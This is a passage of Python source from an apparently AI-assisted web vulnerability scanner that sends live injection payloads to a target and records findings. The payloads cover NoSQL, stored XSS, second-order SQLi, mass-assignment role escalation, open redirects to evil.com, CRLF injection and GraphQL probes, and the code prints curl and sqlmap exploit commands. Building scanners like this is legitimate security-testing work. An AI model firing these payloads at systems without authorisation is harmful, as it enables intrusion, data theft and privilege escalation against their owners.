            re.sub(r"(/\w+)$", r"/.\1", ep.url),
            ep.url.replace(path, path.upper()),
        ]
        # Also try double-slash on admin paths
        if "/admin" in path:
            path_variants.append(ep.url.replace("/admin", "//admin"))
            path_variants.append(ep.url.replace("/admin", "/ADMIN"))

        for variant_url in path_variants:
            if variant_url == ep.url: continue
            r = self.client.get(variant_url)
            self._last_resp = r
            ok, conf, ev = is_real_bypass(r)
            if ok:
                suffix = variant_url[len(ep.url):]
                f = self._make_finding(
                    "A01","Broken Access Control",
                    f"Path Variant Bypass '{suffix}': {path}",
                    "High", conf, variant_url, "GET", "URL_PATH", suffix,
                    ev, f"{base_fp.status}→{r['status']}",
                    f"curl -v '{variant_url}'",
                    "Normalize URL paths before access control checks. Use canonical path comparison.",
                    confirmed=(conf >= 80),
                    response_raw=r.get("body","")[:2000],
                )
                self._print_finding(f)
                findings.append(f)

        # ── 4. HTTP Method override ───────────────────────────────────────────
        method_overrides = [
            ("POST",  {}),
            ("PUT",   {}),
            ("PATCH", {}),
            ("HEAD",  {}),
            ("GET",   {"X-HTTP-Method-Override": "GET"}),
            ("POST",  {"X-HTTP-Method-Override": "GET"}),
        ]
        for method, extra_h in method_overrides:
            r = self.client._request(ep.url, method, headers=extra_h if extra_h else None)
            self._last_resp = r
            ok, conf, ev = is_real_bypass(r)
            if ok:
                label = f"method {method}" + (f" + X-HTTP-Method-Override" if extra_h else "")
                f = self._make_finding(
                    "A01","Broken Access Control",
                    f"HTTP Method Bypass ({method}): {path}",
                    "Medium", conf, ep.url, method, "HTTP_METHOD", method,
                    ev, f"{base_fp.status}→{r['status']}",
                    f"curl -X {method} '{ep.url}'",
                    "Restrict allowed HTTP methods. Check all methods in access control logic.",
                    confirmed=(conf >= 80),
                    response_raw=r.get("body","")[:2000],
                )
                self._print_finding(f)
                findings.append(f)

        if not findings:
            console.print(f"  [dim]  No bypass found for {path}[/dim]")

        return findings

    def _test_security_headers(self, ep: Endpoint,
                               base_fp: BaselineFingerprint) -> List[Finding]:
        """Check missing security headers."""
        r = self.client.get(ep.url)
        hdrs_lower = {k.lower(): v for k,v in r.get("headers",{}).items()}
        missing = []
        required = {
            "strict-transport-security": ("Medium","HSTS missing"),
            "content-security-policy":   ("High","No CSP — XSS easier"),
            "x-frame-options":           ("Medium","Clickjacking possible"),
            "x-content-type-options":    ("Low","MIME sniffing"),
            "referrer-policy":           ("Low","Referrer leakage"),
        }
        for h,(risk,desc) in required.items():
            if h not in hdrs_lower: missing.append({"header":h,"risk":risk,"desc":desc})
        if hdrs_lower.get("access-control-allow-origin","") == "*":
            missing.append({"header":"CORS","risk":"High","desc":"Wildcard CORS"})

        if not missing: return []
        worst = "High" if any(m["risk"]=="High" for m in missing) else "Medium"
        f = self._make_finding(
            "A05","Security Misconfiguration",
            f"Missing security headers ({len(missing)}): {ep.url}",
            worst,90,ep.url,"GET","HTTP_HEADERS","",
            "; ".join(f"{m['header']}: {m['desc']}" for m in missing[:4]),
            "","","Add missing security headers.",
        )
        return [f]

    def _fuzz_params(self, ep: Endpoint,
                     base_fp: BaselineFingerprint) -> List[Finding]:
        """Quick param fuzzing to find hidden parameters."""
        wl = WordlistScanner.best("params")
        if not wl or not shutil.which("ffuf"):
            return []
        sep      = "&" if "?" in ep.url else "?"
        fuzz_url = f"{ep.url}{sep}FUZZ=pentestai"
        cmd      = f"ffuf -u '{fuzz_url}' -w '{wl}' -mc 200,201,302 -fs 0 -t 20 -timeout 5 -s"
        r        = _run_cmd(cmd, timeout=40)
        findings = []
        for line in r.get("output","").splitlines():
            line = line.strip()
            if line and not line.startswith(("[","#","/")):
                test_url = f"{ep.url}{sep}{line}=pentestai"
                resp     = self.client.get(test_url)
                if resp.get("status") == 200 and len(resp.get("body","")) > 100:
                    # Interesting param found — let AI classify
                    console.print(f"  [dim]  Hidden param found: {line}[/dim]")
                    ep.params[f"discovered:{line}"] = "1"
        return findings

    # ═══════════════════════════════════════════════════════════════════════
    # NEW TEST METHODS — A01/A03/A04/A07/A09/A10
    # ═══════════════════════════════════════════════════════════════════════

    def _test_nosqli_full(self, param: str, ep: Endpoint,
                          base_fp: BaselineFingerprint) -> List[Finding]:
        """
        NoSQLi — JSON va form-encoded ikkalasi ham sinash.
        MongoDB, Redis, CouchDB payloadlar.
        """
        pname = param.split(":")[-1]
        findings = []

        # --- JSON payloadlar (application/json uchun) ---
        json_payloads = [
            {pname: {"$gt": ""}},
            {pname: {"$ne": None}},
            {pname: {"$regex": ".*"}},
            {pname: {"$where": "sleep(3)"}},
            {pname: {"$gt": 0}},
            {pname: {"$nin": []}},
        ]

        # --- Form-encoded payloadlar (param[$gt]= format) ---
        form_payloads = [
            f"{pname}[$gt]=",
            f"{pname}[$ne]=null",
            f"{pname}[$regex]=.*",
            f"{pname}[$exists]=true",
            f"{pname}[$gt]=0",
        ]

        orig_val = ep.params.get(param, "")

        # 1. JSON format sinash
        if ep.body_type == "json" or "json" in ep.url.lower():
            for jp in json_payloads[:4]:
                payload_str = json.dumps(jp)
                if self.ctx.already_tested(ep.url, "POST", param, payload_str):
                    continue
                # Merge with existing params
                base_params = {k.split(":")[-1]: v for k, v in ep.params.items()
                               if not k.startswith("header:") and not k.startswith("path:")}
                base_params.update(jp)
                resp = self.client.post(ep.url, json_data=base_params)
                self._last_resp = resp
                diff = self.baseline.diff(base_fp, resp, resp.get("timing", 0))

                # Time-based blind (sleep)
                if diff.get("time_anomaly") and "$where" in payload_str:
                    f = self._make_finding(
                        "A03","Injection",
                        f"Blind NoSQLi (time-based JSON): {ep.url} [{pname}]",
                        "Critical", 88, ep.url, "POST", param, payload_str,
                        f"Response delayed {diff.get('timing_diff',0):.1f}s with $where:sleep(3)",
                        "nosqli_time",
                        f"curl -X POST -H 'Content-Type: application/json' "
                        f"-d '{payload_str}' '{ep.url}'",
                        "Use parameterized queries. Never pass user input to MongoDB operators.",
                        confirmed=True
                    )
                    self._print_finding(f)
                    findings.append(f)
                    break

                # Auth bypass — more data returned
                body = resp.get("body","")
                if (resp.get("status") == 200 and
                    len(body) > base_fp.body_len + 100 and
                    not diff.get("is_custom_404")):
                    ai_r = self.ai.classify_finding({
                        "url": ep.url, "method": "POST", "param": param,
                        "payload": payload_str, "tool": "nosqli_json",
                        "baseline_status": base_fp.status,
                        "baseline_size": base_fp.body_len,
                        "baseline_timing": base_fp.timing_avg,
                        "baseline_title": base_fp.title,
                        "fuzz_status": resp.get("status"),
                        "fuzz_size": len(body),
                        "fuzz_timing": resp.get("timing", 0),
                        "timing_diff": diff.get("timing_diff", 0),
                        "size_diff": diff.get("size_diff", 0),
                        "size_pct": diff.get("size_pct", 0),
                        "time_anomaly": False,
                        "new_errors": diff.get("new_errors", []),
                        "status_changed": diff.get("status_changed", False),
                        "body_snippet": body[:500],
                        "tool_output": f"NoSQLi JSON {jp}: size {base_fp.body_len}→{len(body)}",
                    })
                    if ai_r and ai_r.get("found") and ai_r.get("confidence", 0) >= MIN_CONFIDENCE:
                        f = self._make_finding(
                            "A03","Injection",
                            f"NoSQLi JSON operator injection: {ep.url} [{pname}]",
                            ai_r.get("risk","High"),
                            ai_r.get("confidence",70),
                            ep.url, "POST", param, payload_str,
                            ai_r.get("evidence","NoSQL operator accepted, more data returned"),
                            "nosqli_json",
                            f"curl -X POST -H 'Content-Type: application/json' "
                            f"-d '{payload_str}' '{ep.url}'",
                            "Sanitize all MongoDB operator keys. Use allowlist for accepted fields."
                        )
                        self._print_finding(f)
                        findings.append(f)
                        break

        # 2. Form-encoded format sinash (GET va POST)
        for fp_str in form_payloads[:4]:
            try:
                fp_key, fp_val = fp_str.split("=", 1)
            except ValueError:
                continue
            payload_str = fp_str
            if self.ctx.already_tested(ep.url, ep.method, param, payload_str):
                continue

            # Build URL with form-encoded NoSQLi
            if ep.method == "GET":
                parsed = urllib.parse.urlparse(ep.url)
                qs = dict(urllib.parse.parse_qsl(parsed.query))
                qs[fp_key] = fp_val
                test_url = urllib.parse.urlunparse(
                    parsed._replace(query=urllib.parse.urlencode(qs))
                )
                resp = self.client.get(test_url)
            else:
                clean = {k.split(":")[-1]: v for k, v in ep.params.items()
                         if not k.startswith("header:") and not k.startswith("path:")}
                clean[fp_key] = fp_val
                resp = self.client.post(ep.url, data=clean)

            self._last_resp = resp
            diff = self.baseline.diff(base_fp, resp, resp.get("timing", 0))
            body = resp.get("body","")

            if (resp.get("status") == 200 and
                len(body) > base_fp.body_len + 100 and
                diff.get("size_pct", 0) > 20):
                f = self._make_finding(
                    "A03","Injection",
                    f"NoSQLi form-encoded: {ep.url} [{fp_key}]",
                    "High", 75, ep.url, ep.method, param, payload_str,
                    f"Form-encoded NoSQL operator {fp_key}={fp_val!r} "
                    f"returned {len(body)-base_fp.body_len} extra bytes",
                    "nosqli_form",
                    f"curl '{ep.url}?{fp_str}'",
                    "Reject bracket notation in parameter names. "
                    "Use strict input validation."
                )
                self._print_finding(f)
                findings.append(f)
                break

        return findings

    def _test_stored_xss(self, param: str, ep: Endpoint,
                          base_fp: BaselineFingerprint) -> List[Finding]:
        """
        Stored XSS — payload yuboriladi, keyin sahifa qayta ko'riladi.
        v7 da bor edi, v8 da yo'qolib ketdi — qaytarildi.
        """
        marker   = f"XSSTEST{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}"
        payload  = f'"><img src=x onerror=alert("{marker}")>'
        pname    = param.split(":")[-1]

        # Submit (store)
        if ep.method == "POST":
            params = dict(ep.params)
            params[param] = payload
            clean  = {k.split(":")[-1]: v for k, v in params.items()
                      if not k.startswith("header:") and not k.startswith("path:")}
            self.client.post(ep.url, data=clean)
        else:
            return []

        time.sleep(3.0)  # Async save-lar uchun 3s kutish

        # AI yordamida probe paths — hardcoded emas
        probe_paths = self._find_trigger_urls(ep.url)
        # Fallback qo'shimcha paths
        parsed = urllib.parse.urlparse(ep.url)
        root   = f"{parsed.scheme}://{parsed.netloc}"
        for extra in ["/", "/dashboard", "/profile", "/comments",
                      "/admin", "/feed", "/home", "/inbox"]:
            u = root + extra
            if u not in probe_paths:
                probe_paths.append(u)
        for probe_url in probe_paths:
            resp = self.client.get(probe_url)
            if marker in resp.get("body", ""):
                f = Finding(
                    owasp_id="A03", owasp_name="Injection",
                    title=f"Stored XSS: {ep.url} param={pname}",
                    risk="High", confidence=88,
                    url=probe_url, method="GET", param=param,
                    payload=payload,
                    evidence=f"Marker '{marker}' found in GET {probe_url} after POST to {ep.url}",
                    baseline_diff="stored_xss",
                    tool_output=resp.get("body","")[:400],
                    request_raw=f"POST {ep.url}\n{pname}={payload}",
                    response_raw=resp.get("body","")[:400],
                    exploit_cmd=f"curl -X POST -d '{pname}={urllib.parse.quote(payload)}' '{ep.url}'",
                    remediation="Sanitize ALL user input before storage. Use Content-Security-Policy.",
                    confirmed=True, tool="stored_xss",
                )
                self._print_finding(f)
                return [f]
        return []

    def _find_trigger_urls(self, store_url: str) -> list:
        """
        Second-order SQLi uchun trigger URL-larni AI + crawl bilan topish.
        Hardcoded list emas — real site strukturasiga qarab.
        """
        base = store_url.rsplit("/",1)[0] if "/" in store_url else store_url
        parsed = urllib.parse.urlparse(store_url)
        site_root = f"{parsed.scheme}://{parsed.netloc}"

        # 1. AI dan so'rash
        trigger_candidates = []
        if HAS_OLLAMA:
            prompt = f"""A web app stores user input via: {store_url}
Where would this stored data be RENDERED/EXECUTED later?
Think: profile pages, dashboards, admin panels, reports, exports, emails.

Return JSON: {{"trigger_urls": ["/path1", "/path2", "/path3"]}}"""
            ai_r = self.ai._call(prompt, cache=True)
            if ai_r and ai_r.get("trigger_urls"):
                for path in ai_r["trigger_urls"][:5]:
                    if path.startswith("/"):
                        trigger_candidates.append(site_root + path)
                    elif path.startswith("http"):
                        trigger_candidates.append(path)

        # 2. Heuristic — store URL-dan trigger URL-larni taxmin qilish
        path = parsed.path.lower()
        heuristic = []
        if "/register" in path or "/signup" in path:
            heuristic += ["/profile","/dashboard","/admin/users","/members"]
        elif "/comment" in path or "/review" in path:
            heuristic += ["/comments","/reviews","/admin/comments","/posts"]
        elif "/post" in path or "/article" in path:
            heuristic += ["/articles","/admin/posts","/blog"]
        elif "/user" in path or "/account" in path:
            heuristic += ["/admin/users","/profile","/dashboard"]
        else:
            heuristic += ["/profile","/dashboard","/account","/settings",
                          "/admin","/admin/users","/export","/report"]

        for h in heuristic:
            trigger_candidates.append(site_root + h)

        # 3. Store URL-ning o'zini ham sinash
        trigger_candidates.insert(0, store_url)

        # Deduplicate
        seen, result = set(), []
        for u in trigger_candidates:
            if u not in seen:
                seen.add(u)
                result.append(u)
        return result[:8]

    def _test_second_order_sqli(self, param: str, ep: Endpoint,
                                 base_fp: BaselineFingerprint) -> List[Finding]:
        """
        Second-order SQLi — payload store qilinadi, boshqa endpoint-da trigger.
        v7 da bor edi, v8 da yo'qolib ketdi — qaytarildi.
        """
        if ep.method != "POST": return []
        pname = param.split(":")[-1]

        test_cases = [
            ("sleep_mssql", "admin'; WAITFOR DELAY '0:0:5'--", 5.0),
            ("sleep_mysql",  "admin' AND SLEEP(5)--",           5.0),
            ("error_test",   "admin' AND 1=CONVERT(int,'x')--", 0.0),
            ("union_test",   "' UNION SELECT NULL,NULL,NULL--",  0.0),
        ]

        for name, sqli_payload, expected_delay in test_cases[:2]:
            if self.ctx.already_tested(ep.url, "POST", param, sqli_payload):
                continue

            # Store the payload
            params = dict(ep.params)
            params[param] = sqli_payload
            clean = {k.split(":")[-1]: v for k, v in params.items()
                     if not k.startswith("header:") and not k.startswith("path:")}
            self.client.post(ep.url, data=clean)
            time.sleep(0.5)

            # Trigger on related pages
            # AI yordamida trigger URL-larni topish — hardcoded emas
            trigger_urls = self._find_trigger_urls(ep.url)
            for turl in trigger_urls:
                t0   = time.time()
                resp = self.client.get(turl)
                elapsed = time.time() - t0
                body    = resp.get("body","").lower()

                sql_indicators = [
                    "sql syntax" in body,
                    "mysql_fetch" in body,
                    "ora-" in body,
                    "pg::syntax" in body,
                    "sqlite" in body and "error" in body,
                    "unclosed quotation" in body,
                    "syntax error" in body and "sql" in body,
                    expected_delay > 0 and elapsed >= expected_delay - 0.5 and base_fp.timing_avg < 1.0,
                ]
                if any(sql_indicators):
                    evidence = (f"Time-based: {elapsed:.1f}s delay" if elapsed >= 4
                                else f"Error in body: {body[:150]}")
                    f = Finding(
                        owasp_id="A03", owasp_name="Injection",
                        title=f"Second-Order SQLi [{name}]: {ep.url} → {turl}",
                        risk="Critical", confidence=82,
                        url=ep.url, method="POST", param=param,
                        payload=sqli_payload,
                        evidence=f"Stored via {ep.url}, triggered at {turl}. {evidence}",
                        baseline_diff="second_order_sqli",
                        tool_output=resp.get("body","")[:400],
                        request_raw=f"POST {ep.url}\n{pname}={sqli_payload}",
                        response_raw=resp.get("body","")[:400],
                        exploit_cmd=(f"sqlmap -u '{turl}' --second-url='{ep.url}' "
                                     f"--data='{pname}={sqli_payload}'"),
                        remediation="Use parameterized queries for ALL DB operations including stored data.",
                        confirmed=True, tool="second_order_sqli",
                    )
                    self._print_finding(f)
                    return [f]
        return []

    def _test_mass_assignment(self, ep: Endpoint,
                               base_fp: BaselineFingerprint) -> List[Finding]:
        """
        Mass assignment — POST/PUT da extra field-lar yuborib role/privilege oshirish.
        """
        if ep.method not in ("POST", "PUT", "PATCH"): return []

        extra_fields = {
            "role":         "admin",
            "is_admin":     "true",
            "admin":        "true",
            "status":       "active",
            "verified":     "true",
            "approved":     "true",
            "privilege":    "admin",
            "user_type":    "admin",
            "account_type": "premium",
            "level":        "10",
            "permissions":  "all",
            "is_superuser": "true",
        }

        # Baseline response
        clean_orig = {k.split(":")[-1]: v for k, v in ep.params.items()
                      if not k.startswith("header:") and not k.startswith("path:")}
        orig_resp  = self.client.post(ep.url, data=clean_orig)
        orig_body  = orig_resp.get("body","")

        # Send with extra fields
        mass_params = dict(clean_orig)
        mass_params.update(extra_fields)

        if ep.body_type == "json":
            mass_resp = self.client.post(ep.url, json_data=mass_params)
        else:
            mass_resp = self.client.post(ep.url, data=mass_params)

        mass_body = mass_resp.get("body","")

        # Strategy: POST → keyin GET bilan verify (reflection emas, real change)
        if mass_resp.get("status") in (200, 201, 302):
            # AI yordamida verify URL topish — hardcoded emas
            verify_urls = []
            parsed  = urllib.parse.urlparse(ep.url)
            root    = f"{parsed.scheme}://{parsed.netloc}"

            # AI-dan so'rash
            if HAS_OLLAMA:
                prompt = f"""After a POST to {ep.url} with extra fields like role=admin,
where would the changed user role/privilege be visible?
Return JSON: {{"verify_urls": ["/api/me", "/profile", ...]}}"""
                ai_v = self.ai._call(prompt, cache=True)
                if ai_v and ai_v.get("verify_urls"):
                    for path in ai_v["verify_urls"][:5]:
                        if path.startswith("/"):
                            verify_urls.append(root + path)

            # Heuristic fallback
            for h in ["/api/me","/api/user","/api/v1/me","/api/v2/me",
                      "/me","/profile","/account","/user/me",
                      "/api/users/me","/api/account",ep.url]:
                u = h if h.startswith("http") else root + h
                if u not in verify_urls:
                    verify_urls.append(u)

            for vurl in verify_urls[:8]:
                vr    = self.client.get(vurl)
                vbody = vr.get("body","").lower()
                admin_confirmed = any([
                    '"role":"admin"' in vbody,
                    '"is_admin":true' in vbody,
                    '"admin":true' in vbody,
                    '"privilege":"admin"' in vbody,
                ])
                reflected_keys = [k for k in extra_fields if k in vbody and k in mass_body.lower()]
                if admin_confirmed or (reflected_keys and vbody != orig_body.lower()):
                    evidence_detail = (
                        f"After POSTing {list(extra_fields.keys())[:5]}, "
                        f"GET {vurl} confirms: "
                        f"{'admin role active' if admin_confirmed else str(reflected_keys)}"
                    )
                    f = Finding(
                        owasp_id="A01", owasp_name="Broken Access Control",
                        title=f"Mass Assignment: {ep.url}",
                        risk="Critical" if admin_confirmed else "High",
                        confidence=88 if admin_confirmed else 65,
                        url=ep.url, method=ep.method, param="mass_assignment",
                        payload=json.dumps({k: extra_fields[k] for k in list(extra_fields.keys())[:5]}),
                        evidence=evidence_detail,
                        baseline_diff=f"verify_url={vurl}",
                        tool_output=vr.get("body","")[:400],
                        request_raw=f"{ep.method} {ep.url}\n{json.dumps(extra_fields)}",
                        response_raw=vr.get("body","")[:400],
                        exploit_cmd=f"curl -X POST -d '{urllib.parse.urlencode(extra_fields)}' '{ep.url}'",
                        remediation="Use allowlist for accepted fields. Never bind request body to model.",
                        confirmed=admin_confirmed, tool="mass_assignment",
                    )
                    self._print_finding(f)
                    return [f]
        return []

    def _test_open_redirect(self, param: str, ep: Endpoint,
                             base_fp: BaselineFingerprint) -> List[Finding]:
        """Open redirect — ?next=, ?redirect=, ?url= parametrlarni sinash."""
        redirect_params = {
            "next","redirect","url","return","return_to","continue",
            "destination","dest","redir","goto","target","forward",
            "callback","success","failure","after_login",
        }
        pname = param.split(":")[-1].lower()
        if pname not in redirect_params: return []

        payloads = [
            "https://evil.com",
            "//evil.com",
            "///evil.com",
            "/\\evil.com",
            "https://evil.com%2F@target.com",
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
        ]
        for payload in payloads:
            if self.ctx.already_tested(ep.url, "GET", param, payload): continue
            resp = self._fuzz_request(ep, param, payload)
            self._last_resp = resp

            location = resp.get("headers",{}).get("location",
                       resp.get("headers",{}).get("Location",""))
            body      = resp.get("body","")

            # Confirmed redirect to evil.com
            if "evil.com" in location:
                f = Finding(
                    owasp_id="A01", owasp_name="Broken Access Control",
                    title=f"Open Redirect: {ep.url} param={pname}",
                    risk="Medium", confidence=88,
                    url=ep.url, method=ep.method, param=param,
                    payload=payload,
                    evidence=f"Location header redirects to: {location}",
                    baseline_diff="open_redirect",
                    tool_output=f"Location: {location}",
                    request_raw=f"GET {ep.url}?{pname}={payload}",
                    response_raw=f"Location: {location}",
                    exploit_cmd=f"curl -v '{ep.url}?{pname}={urllib.parse.quote(payload)}'",
                    remediation="Whitelist allowed redirect targets. Never use user input as redirect URL.",
                    confirmed=True, tool="open_redirect",
                )
                self._print_finding(f)
                return [f]

            # Soft redirect — evil.com in body
            if "evil.com" in body and resp.get("status") in (200,302,301):
                f = Finding(
                    owasp_id="A01", owasp_name="Broken Access Control",
                    title=f"Possible Open Redirect (body): {ep.url} param={pname}",
                    risk="Medium", confidence=60,
                    url=ep.url, method=ep.method, param=param,
                    payload=payload,
                    evidence=f"evil.com appears in response body — possible client-side redirect",
                    baseline_diff="open_redirect_body",
                    tool_output=body[:200],
                    request_raw=f"GET {ep.url}?{pname}={payload}",
                    response_raw=body[:200],
                    exploit_cmd=f"curl -v '{ep.url}?{pname}={urllib.parse.quote(payload)}'",
                    remediation="Validate redirect targets server-side.",
                    tool="open_redirect",
                )
                self._print_finding(f)
                return [f]
        return []

    def _test_crlf(self, param: str, ep: Endpoint,
                   base_fp: BaselineFingerprint) -> List[Finding]:
        """CRLF injection — response header injection."""
        payloads = [
            "%0d%0aSet-Cookie:%20evil=injected",
            "%0aSet-Cookie:%20evil=injected",
            "%0d%0aX-Injected:%20header",
            "%0d%0aLocation:%20https://evil.com",
        ]
        for payload in payloads:
            if self.ctx.already_tested(ep.url, "GET", param, payload): continue
            resp = self._fuzz_request(ep, param, payload)
            self._last_resp = resp
            hdrs = {k.lower(): v for k, v in resp.get("headers",{}).items()}

            # Check if header was injected
            if "evil" in hdrs.get("set-cookie","") or                "x-injected" in hdrs or                "evil.com" in hdrs.get("location",""):
                injected_hdr = next(
                    (f"{k}: {v}" for k, v in hdrs.items()
                     if "evil" in v or "injected" in k), "injected header"
                )
                f = Finding(
                    owasp_id="A03", owasp_name="Injection",
                    title=f"CRLF Injection: {ep.url} param={param.split(':')[-1]}",
                    risk="Medium", confidence=90,
                    url=ep.url, method=ep.method, param=param,
                    payload=payload,
                    evidence=f"Injected header found: {injected_hdr}",
                    baseline_diff="crlf_inject",
                    tool_output=f"Injected: {injected_hdr}",
                    request_raw=f"GET {ep.url}?{param.split(':')[-1]}={payload}",
                    response_raw=f"Headers: {dict(list(hdrs.items())[:10])}",
                    exploit_cmd=f"curl -v '{ep.url}?{param.split(':')[-1]}={payload}'",
                    remediation="Strip CR/LF characters from all user inputs used in HTTP headers.",
                    confirmed=True, tool="crlf",
                )
                self._print_finding(f)
                return [f]
        return []

    def _test_graphql(self, ep: Endpoint) -> List[Finding]:
        """GraphQL injection — URL yoki response-dan GraphQL aniqlanganida."""
        url_l = ep.url.lower()
        # URL-based detection
        url_is_graphql = any(x in url_l for x in [
            "/graphql","/gql","/__graphql","/graphiql",
            "/api/query","/query","/data/graphql",
        ])
        # Response-based detection — probe qilib ko'rish
        if not url_is_graphql:
            probe = self.client.post(ep.url, data='{"query":"{__typename}"}',
                                     extra_headers={"Content-Type":"application/json"})
            pb    = probe.get("body","")
            if not ('"data"' in pb and '"__typename"' in pb):
                return []
            console.print(f"  [dim cyan]  GraphQL detected via response at {ep.url}[/dim cyan]")
        findings = []

        # 1. Introspection — schema ma'lumotlari ochiqmi?
        introspect = '{"query":"{ __schema { types { name } } }"}'
        r = self.client.post(ep.url, data=introspect,
                             extra_headers={"Content-Type":"application/json"})
        body = r.get("body","")
        if r.get("status") == 200 and "__schema" in body and "types" in body:
            findings.append(Finding(
                owasp_id="A05", owasp_name="Security Misconfiguration",
                title=f"GraphQL Introspection Enabled: {ep.url}",
                risk="Medium", confidence=90,
                url=ep.url, method="POST", param="query",
                payload=introspect,
                evidence=f"Schema types exposed via introspection",
                baseline_diff="graphql_introspect",
                tool_output=body[:400],
                request_raw=f"POST {ep.url}\n{introspect}",
                response_raw=body[:400],
                exploit_cmd=f"curl -X POST -H 'Content-Type: application/json' -d '{introspect}' '{ep.url}'",
                remediation="Disable introspection in production. Use query depth limiting.",
                confirmed=True, tool="graphql",
            ))

        # 2. Batch query attack
        batch = '[{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"}]'
        r2    = self.client.post(ep.url, data=batch,
                                  extra_headers={"Content-Type":"application/json"})
        if r2.get("status") == 200 and isinstance(r2.get("body",""), str):
            try:
                data = json.loads(r2["body"])
                if isinstance(data, list) and len(data) >= 3:
                    findings.append(Finding(
                        owasp_id="A04", owasp_name="Insecure Design",
                        title=f"GraphQL Batch Queries Allowed: {ep.url}",
                        risk="Medium", confidence=80,
                        url=ep.url, method="POST", param="query",
                        payload=batch,
                        evidence="Server accepts batch queries — brute force / DoS possible",
                        baseline_diff="graphql_batch",
                        tool_output=r2["body"][:300],
                        request_raw=f"POST {ep.url}\n{batch}",
                        response_raw=r2["body"][:300],
                        exploit_cmd=f"# Use batch to bypass rate limiting",
                        remediation="Disable batch queries or add per-query rate limiting.",
                        tool="graphql",
                    ))
            except Exception:
                pass

        # 3. SQL injection in GraphQL args
        sqli_q = '{"query":"{ user(id: \"1 OR 1=1\") { id name } }"}'
        r3     = self.client.post(ep.url, data=sqli_q,
                                   extra_headers={"Content-Type":"application/json"})
        body3  = r3.get("body","").lower()
        if any(x in body3 for x in ["sql syntax","mysql","ora-","pg::"]):
            findings.append(Finding(
                owasp_id="A03", owasp_name="Injection",
                title=f"GraphQL SQL Injection: {ep.url}",
                risk="Critical", confidence=88,
                url=ep.url, method="POST", param="query:id",
                payload=sqli_q,
                evidence=f"SQL error in GraphQL response: {body3[:200]}",
                baseline_diff="graphql_sqli",
                tool_output=r3["body"][:400],
                request_raw=f"POST {ep.url}\n{sqli_q}",
                response_raw=r3["body"][:400],
                exploit_cmd=f"curl -X POST -H 'Content-Type: application/json' -d '{sqli_q}' '{ep.url}'",
                remediation="Use parameterized queries in GraphQL resolvers.",
                confirmed=True, tool="graphql",
            ))

        return findings

    def _fuzz_request(self, ep: Endpoint, param_key: str, payload: str) -> dict:
        params = dict(ep.params)
        params[param_key] = payload
        pname  = param_key.split(":")[-1]

        if param_key.startswith("header:"):
            return self.client.get(ep.url, extra_headers={pname: payload})

        if ep.method == "GET":
            parsed = urllib.parse.urlparse(ep.url)
            qs     = dict(urllib.parse.parse_qsl(parsed.query))
            qs[pname] = payload
            url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(qs)))
            return self.client.get(url)
        clean = {k.split(":")[-1]:v for k,v in params.items()
                 if not k.startswith("header:") and not k.startswith("path:")}
        if ep.body_type == "json":
            return self.client.post(ep.url, json_data=clean)
        return self.client.post(ep.url, data=clean)

    def _rebuild_url(self, url: str, param: str, value: str) -> str:
        parsed = urllib.parse.urlparse(url)
        qs     = dict(urllib.parse.parse_qsl(parsed.query))
        qs[param] = value
        return urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(qs)))

    def _build_req(self, ep: Endpoint, param_key: str, payload: str) -> str:
        pname = param_key.split(":")[-1]
        if ep.method == "GET":
            return f"GET {ep.url}?{pname}={urllib.parse.quote(payload)} HTTP/1.1"
        return f"POST {ep.url}\n\n{pname}={urllib.parse.quote(payload)}"

    def _make_finding(self, owasp_id: str, owasp_name: str, title: str,
                      risk: str, confidence: int, url: str, method: str,
                      param: str, payload: str, evidence: str,
                      baseline_diff: str, exploit_cmd: str, remediation: str,
                      confirmed: bool = False, oob: bool = False,
                      response_raw: str = "") -> Finding:
        return Finding(
            owasp_id=owasp_id, owasp_name=owasp_name, title=title,
            risk=risk, confidence=confidence, url=url, method=method,
            param=param, payload=payload, evidence=evidence,
            baseline_diff=baseline_diff, tool_output="",
            request_raw=f"{method} {url}", response_raw=response_raw,
            exploit_cmd=exploit_cmd, remediation=remediation,
            confirmed=confirmed, oob=oob,
        )

    def _print_finding(self, f: Finding):
        c = {"Critical":"bold red","High":"red","Medium":"yellow","Low":"cyan","Info":"dim"}.get(f.risk,"white")
        console.print(
            f"  [{c}][{f.risk}][/{c}] [bold]{f.owasp_id} — {f.title}[/bold] "
            f"[dim](conf:{f.confidence}%)[/dim]"
        )
        if f.evidence:
            console.print(f"    [dim]Evidence: {f.evidence}[/dim]")


# ─────────────────────────────────────────────────────────────────────────────
# OWASP FUZZ ENGINE — wraps AgenticFuzzEngine with per-endpoint CSRF/rate check
# ─────────────────────────────────────────────────────────────────────────────
class OWASPFuzzEngine:
    """
    Thin wrapper around AgenticFuzzEngine.
    Adds: CSRF check, rate limit check, JWT analysis, XXE probe, deserialzation.
    """
    def __init__(self, client: HTTPClient, baseline: BaselineEngine,
                 kali: KaliToolRunner, ai: AIEngine,
                 ctx: ScanContext, oob: Optional[OOBClient] = None):
        self.agentic = AgenticFuzzEngine(client, baseline, kali, ai, ctx, oob)
        self.client  = client
        self.baseline= baseline
        self.ai      = ai
        self.ctx     = ctx

    def test_endpoint(self, ep: Endpoint) -> List[Finding]:
        findings = self.agentic.test_endpoint(ep)

        base_fp = self.baseline.get(ep)

        # ── Always-run targeted tests ─────────────────────────────────────────
        findings += self._csrf_check(ep, base_fp)
        findings += self._rate_limit_check(ep)
        findings += self._jwt_check(ep, base_fp)
        findings += self._xxe_probe(ep, base_fp)
        findings += self._deser_probe(ep, base_fp)
        findings += self._cors_check(ep)

        # ── New targeted tests ────────────────────────────────────────────────
        findings += self._username_enum(ep)
        findings += self._default_creds(ep)
        findings += self._debug_mode(ep)
        findings += self._sensitive_data_exposure(ep)
        findings += self._ssrf_extended(ep, base_fp)
        findings += self._session_fixation(ep)

        # SSL/TLS check (once per host)
        if ep.url.startswith("https://") or "443" in ep.url:
            findings += self._ssl_check(ep)

        # Business logic (payment/order endpoints)
        url_l = ep.url.lower()
        if any(x in url_l for x in ["/transfer","/pay","/order","/checkout","/redeem","/coupon","/cart"]):
            findings += self._business_logic(ep)

        # Endpoint-specific tests
        if any(x in url_l for x in ["/graphql","/gql","/__graphql","/graphiql"]):
            findings += self.agentic._test_graphql(ep)
        if ep.method in ("POST","PUT","PATCH"):
            findings += self.agentic._test_mass_assignment(ep, base_fp)
        if ep.method == "POST":
            findings += self.agentic._test_stored_xss(
                next((k for k in ep.params if not k.startswith("header:")),
